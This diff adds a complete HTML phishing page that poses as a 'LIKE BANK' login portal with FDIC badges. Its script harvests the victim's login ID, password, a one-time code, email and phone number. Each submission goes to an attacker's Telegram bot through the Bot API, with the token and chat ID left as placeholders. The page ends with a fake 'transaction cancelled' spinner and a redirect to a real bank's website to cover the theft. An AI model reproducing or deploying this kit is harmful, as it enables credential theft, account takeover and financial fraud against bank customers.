@@ -1,0 +1,555 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>LIKE BANK Flows</title>
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,700|Merriweather:700&display=swap" rel="stylesheet">
+  <style>
+    body {
+      background: #000;
+      font-family: 'Roboto', Arial, sans-serif;
+      margin: 0;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+    .fdic-banner {
+      background: #fff;
+      border-radius: 20px;
+      display: flex;
+      align-items: center;
+      padding: 16px 24px;
+      margin-top: 32px;
+      margin-bottom: 28px;
+      width: 85vw;
+      max-width: 420px;
+      box-sizing: border-box;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.03);
+    }
+    .fdic-logo {
+      width: 48px;
+      height: 24px;
+      margin-right: 16px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: none !important;
+    }
+    .fdic-logo img {
+      width: 48px;
+      height: 24px;
+      object-fit: contain;
+      display: block;
+    }
+    .fdic-text {
+      font-size: 15px;
+      font-style: italic;
+      color: #222;
+    }
+    .main-card, .center-content {
+      background: #fff;
+      border-radius: 20px;
+      width: 90vw;
+      max-width: 420px;
+      padding: 32px 24px 32px 24px;
+      box-sizing: border-box;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.06);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-bottom: 0;
+    }
+    .center-content {
+      padding: 48px 24px 48px 24px;
+      min-height: 220px;
+    }
+    .bank-logo-section {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-bottom: 24px;
+    }
+    .bank-logo-section a {
+      display: block;
+    }
+    .bank-logo-img {
+      height: 60px;
+      margin-bottom: 14px;
+    }
+    .input-group {
+      width: 100%;
+      margin-bottom: 16px;
+    }
+    .input-group input {
+      width: 100%;
+      padding: 14px 16px;
+      font-size: 16px;
+      border: 1px solid #d0d0d0;
+      border-radius: 8px;
+      outline: none;
+      box-sizing: border-box;
+      margin-bottom: 0;
+    }
+    .input-group.password {
+      position: relative;
+    }
+    .toggle-password {
+      position: absolute;
+      right: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      z-index: 2;
+    }
+    .toggle-password svg {
+      display: block;
+    }
+    .remember-forgot {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: flex-start;
+      margin-bottom: 16px;
+    }
+    .switch-remember {
+      display: flex;
+      align-items: center;
+      font-size: 22px;
+      color: #757d7e;
+      font-family: inherit;
+      margin-bottom: 8px;
+      cursor: pointer;
+      user-select: none;
+    }
+    .switch-remember input {
+      display: none;
+    }
+    .slider {
+      width: 56px;
+      height: 32px;
+      background: #d1d5d6;
+      border-radius: 16px;
+      position: relative;
+      margin-right: 16px;
+      transition: background 0.2s;
+      display: inline-block;
+      vertical-align: middle;
+    }
+    .slider:before {
+      content: "";
+      position: absolute;
+      left: 4px;
+      top: 4px;
+      width: 24px;
+      height: 24px;
+      background: #fff;
+      border-radius: 50%;
+      transition: transform 0.2s;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.08);
+    }
+    .switch-remember input:checked + .slider {
+      background: #000;
+    }
+    .switch-remember input:checked + .slider:before {
+      transform: translateX(24px);
+    }
+    .remember-text {
+      font-size: 22px;
+      color: #757d7e;
+      font-family: inherit;
+    }
+    .forgot-center {
+      width: 100%;
+      display: flex;
+      justify-content: center;
+    }
+    .forgot-link {
+      font-size: 22px;
+      color: #757d7e;
+      text-decoration: none;
+      font-family: inherit;
+      transition: color 0.2s;
+    }
+    .forgot-link:hover {
+      color: #17928B;
+    }
+    .login-btn, .continue-btn {
+      width: 100%;
+      background: #17928B;
+      color: #fff;
+      font-size: 20px;
+      font-weight: 500;
+      border: none;
+      border-radius: 8px;
+      padding: 14px 0;
+      cursor: pointer;
+      transition: background 0.2s;
+      margin-bottom: 0;
+    }
+    .login-btn:hover, .continue-btn:hover {
+      background: #12706a;
+    }
+    .bottom-card {
+      width: 100%;
+      background: #e0e0e0;
+      border-radius: 0 0 20px 20px;
+      margin-top: 24px;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .quick-row {
+      display: flex;
+      width: 100%;
+      border-bottom: 1px solid #ccc;
+    }
+    .quick-link {
+      flex: 1;
+      text-align: center;
+      padding: 14px 0;
+      font-size: 16px;
+      color: #222;
+      background: none;
+      border: none;
+      cursor: pointer;
+      font-family: inherit;
+      font-weight: 500;
+      transition: background 0.2s;
+    }
+    .quick-link:not(:last-child) {
+      border-right: 1px solid #bbb;
+    }
+    .bottom-links {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      width: 100%;
+      padding: 10px 0 14px 0;
+    }
+    .bottom-links a {
+      color: #222;
+      font-size: 15px;
+      text-decoration: none;
+      margin: 0 8px;
+      transition: color 0.2s;
+    }
+    .bottom-links a:hover {
+      color: #17928B;
+    }
+    .bottom-links .divider {
+      color: #888;
+      margin: 0 8px;
+    }
+    .line-input-group {
+      width: 100%;
+      margin-bottom: 32px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .line-input {
+      width: 100%;
+      font-size: 18px;
+      padding: 12px 0 8px 0;
+      border: none;
+      border-bottom: 2px solid #d0d0d0;
+      outline: none;
+      background: transparent;
+      color: #222;
+      font-family: 'Roboto', Arial, sans-serif;
+      transition: border-color 0.2s;
+      margin-bottom: 24px;
+    }
+    .line-input:focus {
+      border-bottom: 2.5px solid #17928B;
+    }
+    .info-text {
+      font-size: 16px;
+      color: #757d7e;
+      text-align: center;
+      margin-bottom: 32px;
+      font-family: 'Roboto', Arial, sans-serif;
+      line-height: 1.5;
+      max-width: 320px;
+    }
+    .spinner {
+      border: 5px solid #e0e0e0;
+      border-top: 5px solid #17928B;
+      border-radius: 50%;
+      width: 48px;
+      height: 48px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 32px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg);}
+      100% { transform: rotate(360deg);}
+    }
+    .status-text {
+      font-size: 20px;
+      color: #757d7e;
+      text-align: center;
+      margin-bottom: 0;
+      font-family: 'Roboto', Arial, sans-serif;
+      line-height: 1.5;
+      min-height: 28px;
+    }
+    .member-fdic {
+      margin: 40px auto 0 auto;
+      width: 120px;
+      height: 40px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: none;
+      border-radius: 0;
+    }
+    .member-fdic a {
+      display: block;
+      width: 120px;
+      height: 40px;
+    }
+    .member-fdic img {
+      width: 120px;
+      height: 40px;
+      object-fit: contain;
+      display: block;
+    }
+    section.flow { display: none; }
+    section.flow.active { display: block; }
+    @media (max-width: 500px) {
+      .fdic-banner, .main-card, .center-content {
+        width: 98vw;
+        max-width: 98vw;
+        padding-left: 8vw;
+        padding-right: 8vw;
+      }
+      .main-card, .center-content {
+        padding-left: 6vw;
+        padding-right: 6vw;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- FDIC Banner (shared) -->
+  <div class="fdic-banner">
+    <a href="https://imgbb.com/" target="_blank" class="fdic-logo">
+      <img src="https://i.ibb.co/hxnQ6hWh/IMG-0085.jpg" alt="FDIC">
+    </a>
+    <div class="fdic-text">
+      FDIC-Insured - Backed by the full faith and credit of the U.S. Government
+    </div>
+  </div>
+
+  <!-- FLOW 1: Main Login Page -->
+  <section class="flow active" id="flow-login">
+    <form class="main-card" autocomplete="off" id="loginForm">
+      <div class="bank-logo-section">
+        <a href="https://ibb.co/SDRtDkF2" target="_blank">
+          <img src="https://i.ibb.co/gbzSb0kG/IMG-0079.jpg" alt="LIKE BANK Logo" class="bank-logo-img">
+        </a>
+      </div>
+      <div class="input-group">
+        <input type="text" placeholder="Login ID" name="loginid" required>
+      </div>
+      <div class="input-group password">
+        <input type="password" placeholder="Password" name="password" required id="password">
+        <span class="toggle-password" onclick="togglePassword(this)">
+          <!-- Eye with slash SVG (default) -->
+          <svg id="eye-slash" xmlns="http://www.w3.org/2000/svg" width="22" height="22" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <path d="M17.94 17.94A10.06 10.06 0 0 1 12 19c-5 0-9.27-3.11-11-7.5a12.35 12.35 0 0 1 4.22-5.22M9.53 9.53A3 3 0 0 0 12 15a3 3 0 0 0 2.47-5.47M1 1l22 22" stroke="#888" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+          <!-- Eye SVG (hidden initially) -->
+          <svg id="eye" xmlns="http://www.w3.org/2000/svg" width="22" height="22" fill="none" viewBox="0 0 24 24" stroke="currentColor" style="display:none;">
+            <ellipse cx="12" cy="12" rx="10" ry="7" stroke="#888" stroke-width="2"/>
+            <circle cx="12" cy="12" r="3" stroke="#888" stroke-width="2"/>
+          </svg>
+        </span>
+      </div>
+      <div class="remember-forgot">
+        <label class="switch-remember">
+          <input type="checkbox" id="rememberMe" name="remember">
+          <span class="slider"></span>
+          <span class="remember-text">Remember me</span>
+        </label>
+        <div class="forgot-center">
+          <a href="#" class="forgot-link">Forgot your password?</a>
+        </div>
+      </div>
+      <button type="submit" class="login-btn">Log In</button>
+      <div class="bottom-card">
+        <div class="quick-row">
+          <button type="button" class="quick-link">Face ID</button>
+          <button type="button" class="quick-link">Passcode</button>
+        </div>
+        <div class="bottom-links">
+          <a href="#">Locations</a>
+          <span class="divider">|</span>
+          <a href="#">Privacy Policy</a>
+        </div>
+      </div>
+    </form>
+  </section>
+
+  <!-- FLOW 2: Single Line Input + Continue -->
+  <section class="flow" id="flow-single-input">
+    <div class="main-card">
+      <div class="bank-logo-section">
+        <a href="https://ibb.co/SDRtDkF2" target="_blank">
+          <img src="https://i.ibb.co/gbzSb0kG/IMG-0079.jpg" alt="LIKE BANK Logo" class="bank-logo-img">
+        </a>
+      </div>
+      <form autocomplete="off" style="width:100%;" id="singleInputForm">
+        <div class="line-input-group">
+          <input type="text" class="line-input" name="singleinput" placeholder="Enter code" required>
+        </div>
+        <button type="submit" class="continue-btn">Continue</button>
+      </form>
+    </div>
+  </section>
+
+  <!-- FLOW 3: Email & Phone Verification -->
+  <section class="flow" id="flow-verification">
+    <div class="main-card">
+      <div class="bank-logo-section">
+        <a href="https://ibb.co/SDRtDkF2" target="_blank">
+          <img src="https://i.ibb.co/gbzSb0kG/IMG-0079.jpg" alt="LIKE BANK Logo" class="bank-logo-img">
+        </a>
+      </div>
+      <div class="info-text">
+        To protect your account please provide the requested information
+      </div>
+      <form autocomplete="off" style="width:100%;" id="verificationForm">
+        <div class="line-input-group">
+          <input type="email" class="line-input" name="email" placeholder="Email" required>
+          <input type="tel" class="line-input" name="phone" placeholder="Phone Number" required>
+        </div>
+        <button type="submit" class="continue-btn">Continue</button>
+      </form>
+    </div>
+  </section>
+
+  <!-- FLOW 4: Cancel Transaction Animation -->
+  <section class="flow" id="flow-cancel">
+    <div class="center-content">
+      <div class="spinner" id="spinner"></div>
+      <div class="status-text" id="statusText">Canceling transaction...</div>
+    </div>
+  </section>
+
+  <!-- Member FDIC Logo (on black, no background) -->
+  <div class="member-fdic">
+    <a href="https://imgbb.com/" target="_blank">
+      <img src="https://i.ibb.co/mrpwRd7B/IMG-0086.jpg" alt="Member FDIC">
+    </a>
+  </div>
+
+  <script>
+    // Telegram Bot placeholders
+    const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN";
+    const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID";
+
+    // Show only the selected flow
+    function showFlow(id) {
+      document.querySelectorAll('section.flow').forEach(function(sec) {
+        sec.classList.remove('active');
+      });
+      document.getElementById(id).classList.add('active');
+      // Reset cancel flow animation if needed
+      if(id === 'flow-cancel') {
+        document.getElementById('spinner').style.display = 'block';
+        document.getElementById('statusText').textContent = 'Canceling transaction...';
+        setTimeout(function() {
+          document.getElementById('spinner').style.display = 'none';
+          document.getElementById('statusText').textContent = 'Thank you, transaction cancelled';
+          setTimeout(function() {
+            window.location.href = "https://www.equitybank.com/";
+          }, 2000);
+        }, 3000);
+      }
+    }
+
+    // Password toggle
+    function togglePassword(el) {
+      var pwd = document.getElementById('password');
+      var eye = el.querySelector('#eye');
+      var eyeSlash = el.querySelector('#eye-slash');
+      if (pwd.type === "password") {
+        pwd.type = "text";
+        eye.style.display = "block";
+        eyeSlash.style.display = "none";
+      } else {
+        pwd.type = "password";
+        eye.style.display = "none";
+        eyeSlash.style.display = "block";
+      }
+    }
+    function toggleSwitch(el) {
+      // No extra logic needed unless you want to do something on toggle
+    }
+
+    // Telegram sender function
+    function sendToTelegram(message, callback) {
+      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+          parse_mode: "HTML"
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        if(callback) callback();
+      })
+      .catch(err => {
+        if(callback) callback();
+      });
+    }
+
+    // Handle login form
+    document.getElementById('loginForm').onsubmit = function(e) {
+      e.preventDefault();
+      const loginid = this.loginid.value;
+      const password = this.password.value;
+      const remember = this.rememberMe.checked ? "Yes" : "No";
+      const msg = `<b>Login Attempt</b>\nLogin ID: <code>${loginid}</code>\nPassword: <code>${password}</code>\nRemember Me: ${remember}`;
+      sendToTelegram(msg, function() {
+        showFlow('flow-single-input');
+      });
+    };
+
+    // Handle single input form
+    document.getElementById('singleInputForm').onsubmit = function(e) {
+      e.preventDefault();
+      const value = this.singleinput.value;
+      const msg = `<b>Single Input</b>\nValue: <code>${value}</code>`;
+      sendToTelegram(msg, function() {
+        showFlow('flow-verification');
+      });
+    };
+
+    // Handle verification form
+    document.getElementById('verificationForm').onsubmit = function(e) {
+      e.preventDefault();
+      const email = this.email.value;
+      const phone = this.phone.value;
+      const msg = `<b>Verification</b>\nEmail: <code>${email}</code>\nPhone: <code>${phone}</code>`;
+      sendToTelegram(msg, function() {
+        showFlow('flow-cancel');
+      });
+    };
+
+    // Start with login flow
+    showFlow('flow-login');
+  </script>
+</body>
+</html>
